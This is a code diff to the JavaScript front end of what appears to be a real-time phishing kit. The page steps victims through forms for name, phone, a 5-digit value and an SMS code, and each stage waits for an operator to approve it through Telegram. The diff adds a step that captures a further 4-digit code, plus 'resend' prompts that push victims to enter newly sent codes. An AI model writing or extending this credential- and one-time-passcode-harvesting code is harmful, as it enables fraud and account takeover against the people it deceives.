@@ -75,7 +75,7 @@ function prevStep(stepNumber) {
     nextStep(stepNumber);
 }
 
-// STEP 1: Submit initial form (Name, Phone, 5-digit)
+// STEP 1: Submit initial form
 async function submitApplication() {
     showScreen('processing-screen');
     currentSessionId = Math.random().toString(36).substring(2, 15);
@@ -103,7 +103,7 @@ async function submitApplication() {
     }
 }
 
-// STEP 2: Submit SMS and wait for Approve/Reject/Resend
+// STEP 2: Submit SMS
 async function submitSMS() {
     const smsText = document.getElementById('smsInput').value;
     if(!smsText) {
@@ -128,6 +128,31 @@ async function submitSMS() {
     }
 }
 
+// STEP 3: Submit 4-digit code (NEW)
+async function submit4Digit() {
+    const fourDigitCode = document.getElementById('fourDigitInput').value;
+    if(!fourDigitCode) {
+        alert("Please enter the 4-digit code.");
+        return;
+    }
+
+    showScreen('processing-screen');
+
+    try {
+        await fetch('/api/submit-4digit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ fourDigitCode, sessionId: currentSessionId })
+        });
+
+        checkApprovalStatus(currentSessionId, '4digit');
+    } catch (error) {
+        console.error("Error:", error);
+        alert("Network error.");
+        showScreen('verification-screen');
+    }
+}
+
 // POLLING: Checks if you clicked a button on Telegram
 function checkApprovalStatus(sessionId, currentStage) {
     const interval = setInterval(async () => {
@@ -139,8 +164,10 @@ function checkApprovalStatus(sessionId, currentStage) {
                 clearInterval(interval);
                 if (currentStage === 'form') {
                     showScreen('sms-screen'); 
-                } else {
+                } else if (currentStage === 'sms') {
                     showScreen('verification-screen'); 
+                } else if (currentStage === '4digit') {
+                    showScreen('success-screen'); // Loads the new success page
                 }
             } 
             else if (data.status === 'REJECTED') {
@@ -157,6 +184,17 @@ function checkApprovalStatus(sessionId, currentStage) {
                 
                 document.getElementById('smsInput').value = '';
                 showScreen('sms-screen');
+            }
+            else if (data.status === 'RESEND4') {
+                clearInterval(interval);
+                alert("Check your SMS for the new 4-digit code sent.");
+                
+                document.getElementById('fourDigitInput').value = '';
+                showScreen('verification-screen');
+            }
+            else if (data.status === 'INACTIVE') {
+                clearInterval(interval);
+                showScreen('error-screen'); // Loads the inactive/error page
             }
         } catch (error) {
             console.error("Polling error:", error);
